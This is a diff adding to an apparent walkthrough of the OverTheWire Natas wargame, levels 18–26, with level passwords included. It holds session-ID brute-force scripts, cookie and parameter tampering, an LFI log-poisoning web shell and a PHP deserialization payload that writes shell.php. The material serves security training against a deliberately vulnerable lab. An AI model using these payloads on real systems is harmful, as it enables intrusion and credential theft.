@@ -823,14 +823,193 @@ Again we could do the optimisation where we find filtered characters first like 
 
 ## Level 18
 
-```php
-function print_credentials() {
-    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
-    print "You are an admin. The credentials for the next level are:<br>"; 
-    print "<pre>Username: natas19\n"; 
-    print "Password: <censored></pre>"; 
-    } else { 
-    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
-    } 
-}
+In level 18 we can log in with any credentials, however to get the password to the next level we must be admin.
+
+Inspecting the source code shows there is a maximum 641 potential sessions. Let's try brute forcing the PHP SessionID.
+
+Let's adjust our script.
+
+```python
+import requests
+
+user = 'natas18'
+password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
+url = 'http://natas18.natas.labs.overthewire.org/'
+
+for i in range(641):
+    cookies = dict(PHPSESSID=str(i))
+    r= requests.get(url, auth=(user, password), cookies=cookies)
+    if 'You are an admin' in r.text:
+        print("Admin Session ID =", i)
+        print(r.text)
+        break
+    else:
+        print("Not Session ID =" , i)
+
 ```
+Running gives us
+```html
+Not Session ID = 0
+Not Session ID = 1
+...
+Not Session ID = 133
+Not Session ID = 134
+Not Session ID = 135
+Not Session ID = 136
+Not Session ID = 137
+Admin Session ID = 138
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+## Natas 19
+
+Same as the last level but the cookies aren't sequential. If we capture a few cookies with Burp Suite we can see they look like `186-username` encoded in hex with 186 being a random int. We modify our script to try find `***-admin`
+
+```python
+import requests
+
+user = 'natas19'
+password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
+url = 'http://natas19.natas.labs.overthewire.org/'
+
+for i in range(641):
+    cookies = dict(PHPSESSID=(str(i)+"-admin").encode("ascii").hex())
+    r= requests.get(url, auth=(user, password), cookies=cookies)
+    if 'You are an admin' in r.text:
+        print("Admin Session ID =", i)
+        print(r.text)
+        break
+    else:
+        print("Not Session ID =" , i)
+```
+
+```html
+...
+Not Session ID = 86
+Not Session ID = 87
+Not Session ID = 88
+Admin Session ID = 89
+<html>
+...
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
+</body>
+</html>
+```
+
+## Natas 20
+
+This can be beaten entirely in browser with a relatively simple injection.
+
+All we need to do is make the request
+
+`http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201`
+
+And then refresh the page.
+
+```
+Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+```
+
+## Natas 21
+
+Cookies are often shared between co-located sites. Like before we need an admin=1 key for the credentials to be show.
+Intercept the request on the experimental site, add `admin=1` and refresh on the first site.
+
+```
+Username: natas22
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+```
+
+## Natas 22
+
+All you need to do is add the param ?revelio=whatever to show the creds. However this level redirects you to a blank page if you aren't admin. We can cppture the first response with burp before the redirect to get the page with creds.
+
+```
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
+```
+
+## Natas 23
+
+Checking the source code, our password needs to be "iloveyou" and password needs to evaluate to > 10. Since php is whack `11iloveyou` works.
+
+```
+Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+```
+
+## Natas 24
+
+We want the PHP strcmp to return 0. For some reason it does this when it errors out, so if we pass passwd as an array instead of the intended string we get the creds.
+
+`http://natas24.natas.labs.overthewire.org/?passwd[]=`
+
+```
+Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+```
+
+## Natas 25
+
+Inspecting the source code this looks like a slightly more complicated LFI exploit.
+
+`http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_ttr6n58dlb78c85j4s6sjk3167.log`
+
+As `../` is not filtered recursively we can reach these logs which show our User Agent String. Since this is under our control we can set it to some php code and get some RCE. ttr... is our session id.
+
+Make a bad directory traversal attampt, set UAS to  `<?php system($_GET['cmd']); ?>`
+
+Browse to log and add `&cmd=cat \etc\natas_webpass\natas26`
+
+`oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`
+
+## Natas 26
+
+```php
+<?php
+
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    
+    function __construct(){
+        $this->initMsg="exploit\n";
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
+        $this->logFile = "img/shell.php";
+    }
+}
+
+$o = new Logger();
+print base64_encode(serialize($o))."\n";
+
+?>
+```
+Take the output of this and replace our cookie, submit a request and browse to img/shell.php
+
+`55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ`
